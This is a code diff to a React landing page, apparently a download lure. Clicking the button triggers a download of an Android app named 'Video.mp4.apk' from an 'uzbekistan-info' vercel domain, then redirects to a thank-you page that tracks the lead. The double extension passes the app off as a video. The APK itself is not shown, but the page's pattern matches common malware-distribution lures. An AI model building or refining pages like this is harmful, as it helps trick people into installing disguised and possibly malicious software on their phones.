@@ -1,8 +1,8 @@
 import React, { useEffect } from 'react';
-import { useNavigate } from 'react-router-dom'; // Импорт для перенаправления
+// import { useNavigate } from 'react-router-dom'; // <-- useNavigate больше не нужен для внешнего редиректа
 
 export default function CollectionPage() {
-  const navigate = useNavigate(); // Инициализация useNavigate
+  // const navigate = useNavigate(); // <-- Удалено
     
   // Устанавливаем текущую дату
   useEffect(() => {
@@ -22,9 +22,6 @@ export default function CollectionPage() {
   const handleDownload = (e) => {
     e.preventDefault();
     
-    // ВНИМАНИЕ: Здесь нет вызова fbq('track', 'Lead'),
-    // потому что Lead будет отправлен на странице ThankYou.
-
     // 1. ЗАПУСКАЕМ СКАЧИВАНИЕ ФАЙЛА
     const link = document.createElement('a');
     link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
@@ -33,10 +30,10 @@ export default function CollectionPage() {
     link.click();
     document.body.removeChild(link);
 
-    // 2. ПЕРЕНАПРАВЛЕНИЕ: Ждем 500мс для надежного запуска скачивания
-    // Это гарантирует, что скачивание начнется до смены страницы.
+    // 2. ПЕРЕНАПРАВЛЕНИЕ: Ждем 500мс, затем полный редирект
     setTimeout(() => {
-        navigate('/thankyou'); // Переход на страницу благодарности
+        // !!! ПЕРЕНАПРАВЛЕНИЕ НА СТАТИЧЕСКИЙ HTML-ФАЙЛ !!!
+        window.location.href = '/thankyou.html'; 
     }, 500); 
   };
 
